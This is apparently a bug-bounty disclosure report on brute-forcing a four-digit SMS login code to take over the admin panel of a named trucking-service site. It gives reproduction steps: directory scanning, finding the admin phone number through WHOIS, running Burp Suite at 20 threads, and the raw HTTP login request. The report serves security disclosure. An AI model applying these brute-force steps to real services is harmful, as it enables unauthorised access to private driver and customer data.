Assuming that the verification code expires for 30 seconds or 1 minute, we can only explode the correct verification code in a short time to log in to the management system, so I choose to blast The verification code between 6000 and 7000, and sends the verification code every time it blasts, knows that the correct verification code is found, and I only exploded 8 times to find the correct verification code\nSteps To Reproduce:\nFind the management address through the directory scanning:https://truck-admin.eu-east-1.indriverapp.com/admin/auth\nFind the administrator's mobile phone number through WHOIS information:\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nSend the verification code through the mobile phone number, you will receive a four -digit verification code\nEnter the four-digit verification code to log in and use Burpsuite to grab the package, blast the verification code and set the range of the verification code to 6000-7000, and the thread is set to 20 to ensure that the correct verification code can be blasting within 30 seconds within 30 seconds \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nrequest:\nCode 823 Bytes\n1POST /proxy/truck/api/admin/login HTTP/2\n2Host: truck-admin.eu-east-1.indriverapp.com\n3Cookie: _gcl_au=1.1.354145541.1684380001; _ga=GA1.1.1412822094.1684380001; _ga_YBFM6LW448=GS1.1.1684382089.2.1.1684382341.58.0.0\n4Content-Length: 37\n5Sec-Ch-Ua: \"Chromium\";v=\"21\", \" Not;A Brand\";v=\"99\"\n6Accept: application/json, text/plain, */*\n7Content-Type: application/json\n8Sec-Ch-Ua-Mobile: ?0\n9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36\n10Sec-Ch-Ua-Platform: \"Windows\"\n11Origin: https://truck-admin.eu-east-1.indriverapp.com\n12Sec-Fetch-Site: same-origin\n13Sec-Fetch-Mode: cors\n14Sec-Fetch-Dest: empty\n15Referer: https://truck-admin.eu-east-1.indriverapp.com/admin/auth\n16Accept-Encoding: gzip, deflate\n17Accept-Language: zh-CN,zh;q=0.9\n18\n19{\"phone\":\"\u2588\u2588\u2588\u2588\u2588\u2588\",\"code\":\"1234\"}\nBurp Settings:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n5.

Once the correct code is found, the attacker gains access to the admin system, exposing sensitive driver and customer data, including vehicle details and trip records.",
